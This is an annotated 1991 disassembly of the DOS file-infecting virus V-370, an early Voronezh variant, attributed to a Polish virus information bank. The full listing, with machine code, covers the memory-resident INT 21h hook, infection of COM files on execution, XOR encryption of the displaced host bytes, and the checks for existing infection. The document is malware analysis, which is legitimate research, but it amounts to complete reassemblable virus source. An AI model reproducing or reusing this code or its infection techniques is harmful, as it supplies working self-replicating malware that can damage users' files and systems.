

;==============================================
; Virus V-370 (exchange with soviet experts)
; This is the early version of Voronezh 2.01
;
; disassembled by Andrzej Kadlof 1991 August
;
; (C) Polish Section Of Virus Information Bank
;==============================================

; virus entry point
; look for resident part active

0100 B4AB           MOV     AH,AB       ; special function
0102 CD21           INT     21

0104 3D5555         CMP     AX,5555     ; expected answer
0107 7503           JNZ     010C        ; not in RAM yet

0109 EB5B           JMP     0166        ; RAM infected, exit
010B 90             NOP

010C EB2A           JMP     0138        ; instal resident part
010E 90             NOP

;----------------
; INT 21h handler

010F FB             STI
0110 80FCAB         CMP     AH,AB       ; is it virus call?
0113 7504           JNZ     0119

0115 B85555         MOV     AX,5555     ; yes, I'm here!
0118 CF             IRET

0119 3D004B         CMP     AX,4B00     ; load and execute
011C 7515           JNZ     0133        ; jump to old INT 21h

011E 9C             PUSHF
011F 50             PUSH    AX
0120 53             PUSH    BX
0121 51             PUSH    CX
0122 52             PUSH    DX
0123 56             PUSH    SI
0124 57             PUSH    DI
0125 06             PUSH    ES
0126 1E             PUSH    DS
0127 EB7C           JMP     01A5        ; infect
0129 90             NOP

012A 1F             POP     DS
012B 07             POP     ES
012C 5F             POP     DI
012D 5E             POP     SI
012E 5A             POP     DX
012F 59             POP     CX
0130 5B             POP     BX
0131 58             POP     AX
0132 9D             POPF
0133 EA9F113011     JMP     1130:119F

;      ^^^^^^^^  oryginal INT 21h
;----------------------------------
; instal resident part

; get INT 21h

0138 B82135         MOV     AX,3521     ; get INT 21h
013B CD21           INT     21
013D 2E891E3401     MOV     CS:[0134],BX  ; store it
0142 2E8C063601     MOV     CS:[0136],ES

; set INT 81h as old INT 21h

0147 1E             PUSH    DS
0148 8CC0           MOV     AX,ES
014A 8ED8           MOV     DS,AX
014C 8BD3           MOV     DX,BX
014E B88125         MOV     AX,2581
0151 CD21           INT     21
0153 1F             POP     DS

; set new INT 21h

0154 8D160F01       LEA     DX,[010F]
0158 B82125         MOV     AX,2521
015B CD21           INT     21

015D BA7202         MOV     DX,0272     ; virus length
0160 81C20004       ADD     DX,0400     ; working area
0164 CD27           INT     27          ; terminate and stay resident

; exit to application

0166 BE8901         MOV     SI,0189     ; offset of decryption routine
0169 B90001         MOV     CX,0100     ; size of block to move
016C BBA101         MOV     BX,01A1     ; offset of working area
016F 8B3F           MOV     DI,[BX]     ; oryginal carrier length
0171 57             PUSH    DI
0172 BBA301         MOV     BX,01A3     ; offset of virus length
0175 8B07           MOV     AX,[BX]     ; virus length
0177 01C7           ADD     DI,AX       ; file length
0179 81C70001       ADD     DI,0100     ; PSP length
017D FC             CLD
017E 57             PUSH    DI          ; destination above file in RAM
017F F3A4           REPZ    MOVSB       ; copy
0181 5F             POP     DI          ; destination
0182 58             POP     AX          ; oryginal file length
0183 8B0EA301       MOV     CX,[01A3]   ; virus length
0187 57             PUSH    DI
0188 C3             RET                 ; jump to moved code (here 0189h)

;--------------------
; decryption routine
; restore first 172h bytes of carrier

0189 050001         ADD     AX,0100     ; PSP length
018C 8BF0           MOV     SI,AX       ; ptr to last 172h bytes of file
018E BF0001         MOV     DI,0100     ; destination
0191 FC             CLD

0192 8A04           MOV     AL,[SI]     ; get next byte
0194 34BB           XOR     AL,BB       ; decrypt
0196 8805           MOV     [DI],AL     ; copy to begin of file
0198 46             INC     SI
0199 47             INC     DI
019A E2F6           LOOP    0192        ; get next character

019C B80001         MOV     AX,0100     ; return address
019F 50             PUSH    AX
01A0 C3             RET                 ; jump to application

; working area

01A1 E803               ; carrier length before infection
01A3 7201               ; virus length

;--------------------------
; examine file and infecte

01A5 1E             PUSH    DS
01A6 0E             PUSH    CS
01A7 1F             POP     DS
01A8 BB0001         MOV     BX,0100     ; offset of code
01AB B97202         MOV     CX,0272     ; offset of code above virus
01AE 29D9           SUB     CX,BX       ; virus length
01B0 BBA301         MOV     BX,01A3     ; offset of place holder
01B3 890F           MOV     [BX],CX     ; store virus length
01B5 1F             POP     DS
01B6 8BDA           MOV     BX,DX       ; path
01B8 8B4703         MOV     AX,[BX+03]
01BB 3D434F         CMP     AX,4F43     ; 'CO' (safe 'X:COMMAND.COM'?)
01BE 7503           JNZ     01C3

01C0 E967FF         JMP     012A        ; jump to old INT 21h

01C3 B8023D         MOV     AX,3D02     ; open file for read/write
01C6 CD81           INT     81          ; old INT 21h
01C8 7303           JAE     01CD

01CA E95DFF         JMP     012A        ; jump to old INT 21h

; set registers

01CD 50             PUSH    AX          ; store handle
01CE 8CC8           MOV     AX,CS
01D0 8ED8           MOV     DS,AX
01D2 8EC0           MOV     ES,AX
01D4 58             POP     AX
01D5 50             PUSH    AX
01D6 8BD8           MOV     BX,AX       ; handle

; get and check file length

01D8 B90000         MOV     CX,0000
01DB BA0000         MOV     DX,0000
01DE B442           MOV     AH,42       ; move file ptr
01E0 B002           MOV     AL,02       ; to EOF
01E2 CD21           INT     21

01E4 BBA101         MOV     BX,01A1
01E7 8907           MOV     [BX],AX     ; store file length
01E9 BBA301         MOV     BX,01A3
01EC 8B0F           MOV     CX,[BX]     ; virus length
01EE 39C8           CMP     AX,CX
01F0 7704           JA      01F6        ; file to short

01F2 58             POP     AX
01F3 E934FF         JMP     012A        ; jump to old INT 21h

01F6 B90000         MOV     CX,0000     ; move file ptr to BOF
01F9 BA0000         MOV     DX,0000
01FC B80042         MOV     AX,4200
01FF 5B             POP     BX
0200 53             PUSH    BX
0201 CD21           INT     21

0203 BBA301         MOV     BX,01A3
0206 8B0F           MOV     CX,[BX]     ; file length
0208 5B             POP     BX
0209 53             PUSH    BX
020A BA7202         MOV     DX,0272     ; offset of buffer
020D B43F           MOV     AH,3F       ; read file
020F CD21           INT     21

0211 BE7202         MOV     SI,0272     ; offset of buffer
0214 8B0C           MOV     CX,[SI]     ; first two bytes of file
0216 81F9B4AB       CMP     CX,ABB4     ; virus signature
021A 7504           JNZ     0220        ; continue infection

021C 58             POP     AX
021D E90AFF         JMP     012A        ; jump to old INT 21h

0220 81F94D5A       CMP     CX,5A4D     ; EXE file?
0224 7504           JNZ     022A        ; no

0226 58             POP     AX
0227 E900FF         JMP     012A        ; jump to old INT 21h

022A BA0000         MOV     DX,0000
022D B90000         MOV     CX,0000
0230 B80242         MOV     AX,4202
0233 5B             POP     BX
0234 53             PUSH    BX
0235 CD21           INT     21

0237 BEA301         MOV     SI,01A3
023A 8B0C           MOV     CX,[SI]     ; virus length
023C B440           MOV     AH,40       ; write to file
023E 51             PUSH    CX

; decrypt first part of victim code

023F BB7202         MOV     BX,0272

0242 8A07           MOV     AL,[BX]
0244 34BB           XOR     AL,BB
0246 8807           MOV     [BX],AL
0248 43             INC     BX
0249 E2F7           LOOP    0242

024B 59             POP     CX
024C 5B             POP     BX
024D 53             PUSH    BX
024E BA7202         MOV     DX,0272     ; offset of encrypted block
0251 CD21           INT     21

0253 B80042         MOV     AX,4200     ; move file ptr to BOF
0256 BA0000         MOV     DX,0000
0259 B90000         MOV     CX,0000
025C CD21           INT     21

025E BEA301         MOV     SI,01A3     ; offset of virus length
0261 8B0C           MOV     CX,[SI]     ; virus length
0263 BA0001         MOV     DX,0100     ; offset of virus code
0266 B440           MOV     AH,40       ; write file
0268 CD21           INT     21

026A B43E           MOV     AH,3E       ; close file
026C 5B             POP     BX
026D CD21           INT     21

026F E9B8FE         JMP     012A        ; jump to old INT 21h


